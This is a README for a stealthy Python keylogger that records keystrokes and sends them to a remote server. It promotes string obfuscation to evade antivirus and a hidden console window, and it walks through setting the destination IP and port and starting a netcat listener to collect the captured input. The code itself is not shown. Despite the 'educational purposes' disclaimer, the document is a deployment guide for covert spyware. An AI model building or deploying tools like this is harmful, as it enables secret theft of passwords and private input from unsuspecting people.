# Key-Mouse Logger

This script captures keyboard and mouse events and sends them to a remote server. It includes several enhancements for stealthiness, robustness, and flexibility.

## Features
- Captures keyboard events.
- Sends captured events to a remote server.
- Configurable target IP and port.
- Obfuscates strings to evade detection.
- Hides the console window for stealth.

## Requirements
- Python 3.x
- `pyautogui`
- `pynput`

## Installation

### 1. Install Python
Ensure you have Python 3.x installed on your system. You can download it from [python.org](https://www.python.org/downloads/).

### 2. Install Dependencies
Open your terminal or command prompt and run the following command to install the required libraries:
```
pip install pyautogui pynput
```

## Configuration

### Setting Up the Target IP and Port

The script uses environment variables to configure the target IP address and port. You can set these variables in your terminal or command prompt.

### On Linux
1. Open your terminal.
2. Set the environment variables:

```
export TARGET_IP='your_target_ip'
export TARGET_PORT='your_target_port'
```

Replace `your_target_ip` with the IP address of the target server and `your_target_port` with the desired port number.

### On Windows
1. Open Command Prompt.
2. Set the environment variables:

```
set TARGET_IP=your_target_ip
set TARGET_PORT=your_target_port
```

Replace `your_target_ip` with the IP address of the target server and `your_target_port` with the desired port number.

## Running the Script

1. Ensure the target server is set up to listen for incoming connections. You can use Netcat for this purpose.

### On Linux
```
nc -l -p 1234
```

### On Windows
```
ncat -l -p 1234
```

2. Run the script:

```
python 

key-mouse-logger.py


```

## Notes
- The script includes functions to obfuscate and de-obfuscate strings, making it harder for antivirus software to detect specific keywords.
- The script hides the console window using the `ctypes` library, making it less visible to the user.
- Improved exception handling ensures the script continues running even if errors occur.

## Disclaimer
This script is intended for educational purposes only. Unauthorized use of this script to capture and transmit data without consent is illegal and unethical. Use it responsibly.
